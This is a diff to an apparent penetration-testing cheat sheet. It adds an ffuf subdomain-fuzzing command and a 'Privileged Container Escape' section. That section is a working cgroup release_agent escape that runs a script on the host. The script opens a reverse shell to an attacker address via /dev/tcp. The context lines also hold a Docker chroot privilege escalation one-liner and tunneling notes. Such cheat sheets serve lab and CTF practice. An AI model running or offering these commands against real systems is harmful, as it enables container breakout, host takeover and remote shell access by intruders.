@@ -48,6 +48,10 @@ snmpwalk -c <COMMUNITY_STRING> -v1 <TARGET_IP> 1.3.6.1.4.1.77.1.2.25
 dnsrecon -d <TARGET_DOMAIN> -n <TARGET_IP>
 ```
 
+```bash
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H "Host: FUZZ.<TARGET_DOMAIN>"
+```
+
 # File Transfer Methods
 
 ## HTTP Server Setup
@@ -137,6 +141,19 @@ lxc exec ignite /bin/sh
 docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
+## Privileged Container Escape
+
+```bash
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/bash' > /cmd
+echo "/bin/bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+```
+
 ## Shell Upgrade and Stabilization
 
 ```bash
@@ -161,7 +178,7 @@ rpcinfo -p
 ssh -L <PORT>:localhost:<PORT> <USER_NAME>@<TARGET_IP>
 ```
 
-### Chisel for Port Forwarding and Tunneling
+## Chisel for Port Forwarding and Tunneling
 
 Download:
 
